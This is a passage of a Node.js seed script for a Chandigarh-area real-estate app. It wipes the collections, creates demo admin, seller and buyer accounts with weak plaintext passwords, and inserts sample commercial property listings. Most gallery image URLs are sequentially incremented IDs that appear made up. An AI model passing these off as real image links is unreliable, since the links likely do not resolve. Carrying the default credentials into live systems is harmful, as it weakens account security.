require('dotenv').config();
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const connectDB = require('./config/database');

// Import models
const User = require('./models/User');
const Property = require('./models/Property');
const Enquiry = require('./models/Enquiry');

// Connect to database
connectDB();

// Helper function to generate image gallery (8-20 images) with varied images
const generateImageGallery = (count, type = 'general') => {
  const imageSets = {
    factory: [
      'https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800',
      'https://images.unsplash.com/photo-1581092160562-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160607-ee22621dd758?w=800',
      'https://images.unsplash.com/photo-1581092160561-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160563-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160564-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160565-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160566-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160567-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160568-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160569-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160570-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160571-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160572-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160573-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160574-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160575-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160576-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160577-40aa28e2f72d?w=800',
      'https://images.unsplash.com/photo-1581092160578-40aa28e2f72d?w=800',
    ],
    warehouse: [
      'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116312-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116313-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116314-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116315-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116316-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116317-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116318-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116319-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116320-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116321-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116322-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116323-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116324-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116325-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116326-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116327-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116328-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116329-ad8dd3c8310d?w=800',
      'https://images.unsplash.com/photo-1586528116330-ad8dd3c8310d?w=800',
    ],
    office: [
      'https://images.unsplash.com/photo-1497366216548-37526070144c?w=800',
      'https://images.unsplash.com/photo-1497366754035-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366811353-6870744d04b2?w=800',
      'https://images.unsplash.com/photo-1497366754036-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754037-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754038-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754039-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754040-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754041-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754042-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754043-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754044-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754045-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754046-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754047-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754048-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754049-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754050-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754051-f200968a6e72?w=800',
      'https://images.unsplash.com/photo-1497366754052-f200968a6e72?w=800',
    ],
    shop: [
      'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300918-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300919-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300920-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300921-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300922-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300923-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300924-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300925-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300926-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300927-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300928-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300929-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300930-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300931-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300932-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300933-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300934-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300935-64674bd600d8?w=800',
      'https://images.unsplash.com/photo-1441986300936-64674bd600d8?w=800',
    ],
    hotel: [
      'https://images.unsplash.com/photo-1566073771259-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771260-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771261-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771262-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771263-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771264-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771265-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771266-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771267-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771268-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771269-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771270-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771271-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771272-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771273-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771274-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771275-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771276-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771277-6a8506099945?w=800',
      'https://images.unsplash.com/photo-1566073771278-6a8506099945?w=800',
    ],
    cafe: [
      'https://images.unsplash.com/photo-1554118811-1e0d58224f24?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f25?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f26?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f27?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f28?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f29?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f30?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f31?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f32?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f33?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f34?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f35?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f36?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f37?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f38?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f39?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f40?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f41?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f42?w=800',
      'https://images.unsplash.com/photo-1554118811-1e0d58224f43?w=800',
    ],
    restaurant: [
      'https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135468-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135469-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135470-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135471-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135472-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135473-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135474-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135475-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135476-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135477-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135478-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135479-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135480-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135481-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135482-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135483-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135484-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135485-4c7edcad34c4?w=800',
      'https://images.unsplash.com/photo-1517248135486-4c7edcad34c4?w=800',
    ],
    pg: [
      'https://images.unsplash.com/photo-1522708323590-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323591-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323592-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323593-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323594-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323595-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323596-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323597-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323598-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323599-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323600-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323601-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323602-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323603-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323604-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323605-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323606-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323607-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323608-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1522708323609-d24dbb6b0267?w=800',
    ],
    general: [
      'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=800',
      'https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=800',
      'https://images.unsplash.com/photo-1564013799919-ab600027ffc6?w=800',
      'https://images.unsplash.com/photo-1568605114967-8130f3a36994?w=800',
      'https://images.unsplash.com/photo-1560448075-cbc16bb4af33?w=800',
      'https://images.unsplash.com/photo-1560449752-7d2e7b0b0b0b?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b0b?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b0c?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b0d?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b0e?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b0f?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b10?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b11?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b12?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b13?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b14?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b15?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b16?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b17?w=800',
      'https://images.unsplash.com/photo-1560448204-61dc5c5e5b18?w=800',
    ],
  };
  
  const images = imageSets[type.toLowerCase()] || imageSets.general;
  return images.slice(0, count);
};

const seedDatabase = async () => {
  try {
    // Clear existing data
    await User.deleteMany({});
    await Property.deleteMany({});
    await Enquiry.deleteMany({});
    console.log('✅ Cleared existing data');

    // Create Admin Users
    const adminUser = await User.create({
      name: 'Admin User',
      email: 'admin@premiumestate.com',
      phone: '+91-9876543210',
      password: 'admin123',
      role: 'admin',
      isActive: true,
    });
    console.log('✅ Created admin user');

    // Create Sellers
    const sellers = await User.create([
      {
        name: 'Rajesh Kumar',
        email: 'rajesh.seller@premiumestate.com',
        phone: '+91-9876543211',
        password: 'seller123',
        role: 'seller',
        isActive: true,
      },
      {
        name: 'Priya Sharma',
        email: 'priya.seller@premiumestate.com',
        phone: '+91-9876543212',
        password: 'seller123',
        role: 'seller',
        isActive: true,
      },
      {
        name: 'Amit Patel',
        email: 'amit.seller@premiumestate.com',
        phone: '+91-9876543213',
        password: 'seller123',
        role: 'seller',
        isActive: true,
      },
      {
        name: 'Sandeep Singh',
        email: 'sandeep.seller@premiumestate.com',
        phone: '+91-9876543214',
        password: 'seller123',
        role: 'seller',
        isActive: true,
      },
    ]);
    console.log('✅ Created 4 sellers');

    // Create Buyers
    const buyers = await User.create([
      {
        name: 'Rahul Singh',
        email: 'rahul.buyer@premiumestate.com',
        phone: '+91-9876543215',
        password: 'buyer123',
        role: 'user',
        isActive: true,
      },
      {
        name: 'Neha Verma',
        email: 'neha.buyer@premiumestate.com',
        phone: '+91-9876543216',
        password: 'buyer123',
        role: 'user',
        isActive: true,
      },
      {
        name: 'Vivek Gupta',
        email: 'vivek.buyer@premiumestate.com',
        phone: '+91-9876543217',
        password: 'buyer123',
        role: 'user',
        isActive: true,
      },
    ]);
    console.log('✅ Created 3 buyers');

    // Tricity locations
    const cities = ['Chandigarh', 'Mohali', 'Kharar', 'Zirakpur'];
    const localities = {
      'Chandigarh': ['Sector 17', 'Sector 22', 'Sector 35', 'Sector 43', 'Industrial Area Phase 1'],
      'Mohali': ['Phase 1', 'Phase 3B2', 'Phase 5', 'Phase 7', 'Sohana'],
      'Kharar': ['Kharar Main', 'Kharar Bypass', 'New Kharar', 'Kharar Industrial Area'],
      'Zirakpur': ['Zirakpur Main', 'Baltana', 'Dera Bassi', 'Zirakpur Bypass']
    };

    // Create Properties for each category
    const properties = [];

    // Factory Properties
    const factoryProperties = [
      {
        title: 'Modern Manufacturing Factory in Industrial Area Phase 1, Chandigarh',
        description: 'Spacious manufacturing unit with high ceilings, loading docks, and excellent connectivity. Perfect for production units, packaging, or assembly operations. Fully equipped with power backup and security systems.',
        propertyType: 'Factory',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Industrial Area Phase 1',
          fullAddress: 'Plot No. 45, Industrial Area Phase 1, Chandigarh',
        },
        pricing: {
          basePrice: 25000000,
          finalPrice: 25000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 15000,
          carpetArea: 12000,
          bedrooms: 0,
          bathrooms: 4,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800',
          gallery: generateImageGallery(12),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 45,
        enquiries: 8,
      },
      {
        title: 'Large Scale Factory Unit in Phase 7, Mohali',
        description: 'Premium factory space with modern infrastructure, 3-phase power supply, and ample parking. Ideal for heavy manufacturing or large-scale operations.',
        propertyType: 'Factory',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 7',
          fullAddress: 'SCO 123-125, Phase 7, Mohali',
        },
        pricing: {
          basePrice: 150000,
          finalPrice: 150000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 20000,
          carpetArea: 18000,
          bedrooms: 0,
          bathrooms: 6,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800',
          gallery: generateImageGallery(15, 'factory'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 32,
        enquiries: 5,
      },
    ];

    // Warehouse Properties
    const warehouseProperties = [
      {
        title: 'Spacious Warehouse in Kharar Industrial Area',
        description: 'Large warehouse facility with high ceilings, loading bays, and excellent storage capacity. Perfect for logistics, distribution, or storage businesses.',
        propertyType: 'Warehouse',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Kharar',
          locality: 'Kharar Industrial Area',
          fullAddress: 'Warehouse No. 12, Kharar Industrial Area, Kharar',
        },
        pricing: {
          basePrice: 18000000,
          finalPrice: 18000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 25000,
          carpetArea: 22000,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800',
          gallery: generateImageGallery(10, 'warehouse'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 28,
        enquiries: 4,
      },
      {
        title: 'Modern Warehouse Facility in Zirakpur',
        description: 'State-of-the-art warehouse with temperature control, security systems, and easy access to highways. Ideal for cold storage or premium goods storage.',
        propertyType: 'Warehouse',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Zirakpur',
          locality: 'Zirakpur Bypass',
          fullAddress: 'Warehouse Complex, Zirakpur Bypass, Zirakpur',
        },
        pricing: {
          basePrice: 80000,
          finalPrice: 80000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 18000,
          carpetArea: 16000,
          bedrooms: 0,
          bathrooms: 4,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1586528116311-ad8dd3c8310d?w=800',
          gallery: generateImageGallery(18, 'warehouse'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 41,
        enquiries: 7,
      },
    ];

    // Office Properties
    const officeProperties = [
      {
        title: 'Premium Office Space in Sector 22, Chandigarh',
        description: 'Modern office space in prime location with excellent connectivity, parking, and professional ambiance. Perfect for corporate offices, startups, or professional services.',
        propertyType: 'Office',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 22',
          fullAddress: 'SCO 45-47, Sector 22, Chandigarh',
        },
        pricing: {
          basePrice: 75000,
          finalPrice: 75000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 3000,
          carpetArea: 2500,
          bedrooms: 0,
          bathrooms: 4,
          floorNumber: '2nd Floor',
          totalFloors: '3',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1497366216548-37526070144c?w=800',
          gallery: generateImageGallery(14, 'office'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 67,
        enquiries: 12,
      },
      {
        title: 'Corporate Office in Phase 5, Mohali',
        description: 'Spacious corporate office with conference rooms, reception area, and modern facilities. Located in prime business district.',
        propertyType: 'Office',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 5',
          fullAddress: 'SCO 78-80, Phase 5, Mohali',
        },
        pricing: {
          basePrice: 12000000,
          finalPrice: 12000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 4500,
          carpetArea: 3800,
          bedrooms: 0,
          bathrooms: 6,
          floorNumber: '1st & 2nd Floor',
          totalFloors: '2',
          furnishingStatus: 'Semi-Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1497366216548-37526070144c?w=800',
          gallery: generateImageGallery(16, 'office'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 54,
        enquiries: 9,
      },
      {
        title: 'Co-working Office Space in Sector 35, Chandigarh',
        description: 'Flexible office space perfect for startups and small businesses. Includes shared facilities, meeting rooms, and high-speed internet.',
        propertyType: 'Office',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 35',
          fullAddress: 'SCO 112, Sector 35, Chandigarh',
        },
        pricing: {
          basePrice: 45000,
          finalPrice: 45000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 2000,
          carpetArea: 1700,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: '3rd Floor',
          totalFloors: '4',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1497366216548-37526070144c?w=800',
          gallery: generateImageGallery(11, 'office'),
        },
        createdBy: sellers[3]._id,
        status: 'Approved',
        views: 89,
        enquiries: 15,
      },
    ];

    // Shop Properties
    const shopProperties = [
      {
        title: 'Prime Retail Shop in Sector 17, Chandigarh',
        description: 'High-footfall retail space in the heart of Chandigarh. Perfect for fashion, electronics, or any retail business. Excellent visibility and customer access.',
        propertyType: 'Shop',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 17',
          fullAddress: 'Shop No. 23, Sector 17 Plaza, Chandigarh',
        },
        pricing: {
          basePrice: 55000,
          finalPrice: 55000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 800,
          carpetArea: 650,
          bedrooms: 0,
          bathrooms: 1,
          floorNumber: 'Ground Floor',
          totalFloors: '3',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
          gallery: generateImageGallery(9, 'shop'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 112,
        enquiries: 18,
      },
      {
        title: 'Corner Shop in Phase 3B2, Mohali',
        description: 'Corner location shop with excellent visibility and parking. Ideal for showroom, restaurant, or retail business.',
        propertyType: 'Shop',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 3B2',
          fullAddress: 'Corner Shop, SCO 56, Phase 3B2, Mohali',
        },
        pricing: {
          basePrice: 3500000,
          finalPrice: 3500000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 1200,
          carpetArea: 1000,
          bedrooms: 0,
          bathrooms: 2,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
          gallery: generateImageGallery(13, 'shop'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 76,
        enquiries: 11,
      },
      {
        title: 'Showroom Space in Zirakpur Main',
        description: 'Spacious showroom perfect for automobile, furniture, or large product display. High visibility location with ample parking.',
        propertyType: 'Shop',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Zirakpur',
          locality: 'Zirakpur Main',
          fullAddress: 'Showroom No. 5, Zirakpur Main Road, Zirakpur',
        },
        pricing: {
          basePrice: 65000,
          finalPrice: 65000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 2500,
          carpetArea: 2200,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: 'Ground Floor',
          totalFloors: '1',
          furnishingStatus: 'Semi-Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
          gallery: generateImageGallery(17, 'shop'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 93,
        enquiries: 14,
      },
    ];

    // Hotel Properties
    const hotelProperties = [
      {
        title: 'Boutique Hotel in Sector 43, Chandigarh',
        description: 'Well-established boutique hotel with 25 rooms, restaurant, and conference facilities. Prime location with excellent connectivity. Running business with good revenue.',
        propertyType: 'Hotel',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 43',
          fullAddress: 'Hotel Grand, Sector 43, Chandigarh',
        },
        pricing: {
          basePrice: 85000000,
          finalPrice: 85000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 35000,
          carpetArea: 28000,
          bedrooms: 25,
          bathrooms: 30,
          floorNumber: 'Ground to 3rd',
          totalFloors: '4',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1566073771259-6a8506099945?w=800',
          gallery: generateImageGallery(20, 'hotel'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 145,
        enquiries: 22,
      },
      {
        title: 'Budget Hotel in Phase 1, Mohali',
        description: 'Running budget hotel with 15 rooms, reception, and basic amenities. Good location near airport and business district.',
        propertyType: 'Hotel',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 1',
          fullAddress: 'Hotel Comfort, Phase 1, Mohali',
        },
        pricing: {
          basePrice: 120000,
          finalPrice: 120000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 12000,
          carpetArea: 10000,
          bedrooms: 15,
          bathrooms: 18,
          floorNumber: 'Ground to 2nd',
          totalFloors: '3',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1566073771259-6a8506099945?w=800',
          gallery: generateImageGallery(16, 'hotel'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 98,
        enquiries: 16,
      },
    ];

    // Industrial Properties
    const industrialProperties = [
      {
        title: 'Industrial Unit in Kharar Industrial Area',
        description: 'Large industrial space suitable for manufacturing, processing, or heavy machinery operations. Excellent infrastructure and connectivity.',
        propertyType: 'Industrial',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Kharar',
          locality: 'Kharar Industrial Area',
          fullAddress: 'Industrial Plot No. 78, Kharar Industrial Area, Kharar',
        },
        pricing: {
          basePrice: 22000000,
          finalPrice: 22000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 18000,
          carpetArea: 15000,
          bedrooms: 0,
          bathrooms: 5,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800',
          gallery: generateImageGallery(12, 'factory'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 38,
        enquiries: 6,
      },
      {
        title: 'Industrial Shed in Zirakpur',
        description: 'Spacious industrial shed with high ceilings, loading facilities, and power supply. Perfect for storage or light manufacturing.',
        propertyType: 'Industrial',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Zirakpur',
          locality: 'Baltana',
          fullAddress: 'Industrial Shed No. 12, Baltana, Zirakpur',
        },
        pricing: {
          basePrice: 95000,
          finalPrice: 95000,
          currency: 'INR',
        },
